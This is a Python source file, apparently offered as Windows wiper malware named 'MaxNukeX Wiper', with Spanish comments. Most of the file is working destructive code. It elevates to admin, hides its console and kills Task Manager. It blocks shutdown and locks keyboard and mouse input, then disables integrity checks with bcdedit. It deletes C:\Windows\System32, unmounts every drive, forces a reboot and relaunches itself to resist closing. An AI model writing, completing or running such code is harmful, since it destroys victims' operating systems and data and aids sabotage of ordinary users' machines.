# Welcome to src "MaxNukeX Wiper""

import subprocess
import sys
import os
import ctypes
import win32api
import win32con
import win32gui
import psutil
import random
import threading
import time
from win32com.shell import shell, shellcon
import shutil

# Función para ocultar la consola
def hide_console():
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception as e:
        print(f"Error al intentar ocultar la consola: {e}")

def prevent_task_manager():
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'taskmgr.exe':
                os.system("taskkill /f /im taskmgr.exe")  # Cierra el Administrador de Tareas
        time.sleep(1)

def block_shutdown():
    def wndproc(hwnd, msg, wparam, lparam):
        if msg == win32con.WM_QUERYENDSESSION:
            return False  # Evita el apagado
        return True

    class WNDCLASS:
        lpfnWndProc = wndproc

    wc = WNDCLASS()
    win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(wc, "AntiShutdown", 0, 0, 0, 0, 0, 0, 0, 0, None)
    win32gui.PumpMessages()  # Mantiene la ventana activa
            
# Función para bloquear el teclado y ratón durante 15 minutos
def block_input(duration=900):
    try:
        ctypes.windll.user32.BlockInput(True)  # Bloquear
        time.sleep(duration)  # Esperar 15 minutos (900 segundos)
        ctypes.windll.user32.BlockInput(False)  # Liberar
    except Exception as e:
        print(f"Error al bloquear la entrada: {e}")

# Desactivar Protección de Archivos del Sistema (SFP)
def disable_sfp():
    try:
        subprocess.run('bcdedit /set nointegritychecks on', shell=True, check=True)
        print("Protección de archivos del sistema desactivada.")
    except Exception as e:
        print(f"Error al desactivar la protección de archivos del sistema: {e}")

# Función principal para ejecutar acciones destructivas
def main_task():
    d = ["C:\\Windows\\System32"]
    drivers = [f"oem{numero}" for numero in range(10)]

    # Desactivar Protección de Archivos del Sistema
    disable_sfp()

    # Eliminar archivos críticos del sistema
    for driver in drivers + d:
        try:
            if os.path.isfile(driver):
                os.remove(driver)
            elif os.path.isdir(driver):
                shutil.rmtree(driver)
        except Exception as e:
            print(f"Error al eliminar {driver}: {e}")

    # Desmontar unidades
    drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
    for drive in drives:
        try:
            ctypes.windll.kernel32.SetVolumeMountPointW(drive, None)
        except Exception as e:
            print(f"Error al desmontar {drive}: {e}")

    # Reiniciar el sistema
    try:
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        print(f"Error al reiniciar: {e}")

# Función para encontrar una ventana aleatoria
def get_random_window():
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            windows.append(hwnd)

    windows = []
    win32gui.EnumWindows(callback, windows)
    return random.choice(windows) if windows else None

# Superposición sobre una ventana aleatoria
def focus_on_window():
    hwnd_random = get_random_window()
    if hwnd_random:
        rect = win32gui.GetWindowRect(hwnd_random)
        x, y, w, h = rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1]
        hwnd_self = win32gui.CreateWindowEx(
            win32con.WS_EX_TOPMOST,
            "STATIC",  # Clase válida para ventanas estáticas
            "",
            win32con.WS_POPUP,
            x, y, w, h,
            0, 0, 0, None
        )
        win32gui.ShowWindow(hwnd_self, win32con.SW_SHOW)
    else:
        print("No se encontró una ventana para superponer.")

# Verificación de permisos de administrador
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        print(f"Error al verificar permisos de administrador: {e}")
        return False

# Pedir permisos de administrador
def run_as_admin():
    if not is_admin():
        try:
            script = sys.argv[0]
            shell.ShellExecuteEx(nShow=1, verb="runas", cmdLine=script)
            sys.exit(0)
        except Exception as e:
            print(f"Error al pedir permisos de administrador: {e}")

# Buscar PID de un proceso por nombre
def get_pid_by_name(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                return proc.info['pid']
    except Exception as e:
        print(f"Error al buscar el proceso {process_name}: {e}")
    return None

# Iniciar un proceso aleatorio si no se encuentra el indicado
def start_random_process():
    processes = ["notepad.exe", "calc.exe", "wordpad.exe", "cmd.exe"]
    process_name = random.choice(processes)
    try:
        subprocess.Popen(process_name)
        print(f"Iniciado el proceso {process_name}")
        return get_pid_by_name(process_name)
    except Exception as e:
        print(f"Error al iniciar {process_name}: {e}")
    return None

# Función para evitar que el CMD principal se cierre y reiniciar si se intenta
def prevent_cmd_close():
    try:
        # Iniciar una nueva instancia de CMD que ejecute el mismo script
        subprocess.Popen(["cmd.exe", "/k", sys.executable, sys.argv[0]])
    except Exception as e:
        print(f"Error al iniciar la ventana CMD: {e}")

# Ejecución principal
def start_execution():
    hide_console()
    focus_on_window()

    # Prevenir el cierre del CMD
    prevent_cmd_close()

    pid = get_pid_by_name('notepad.exe')
    if not pid:
        print("Proceso no encontrado. Iniciando uno aleatorio.")
        pid = start_random_process()  # Inicia un proceso aleatorio y obtiene su PID
        if not pid:
            print("No se pudo iniciar ni encontrar un proceso.")
            return

    # Bloquear teclado y ratón por 15 minutos
    block_input(900)

    threading.Thread(target=main_task, daemon=True).start()

def DllMain():
    run_as_admin()
    start_execution()
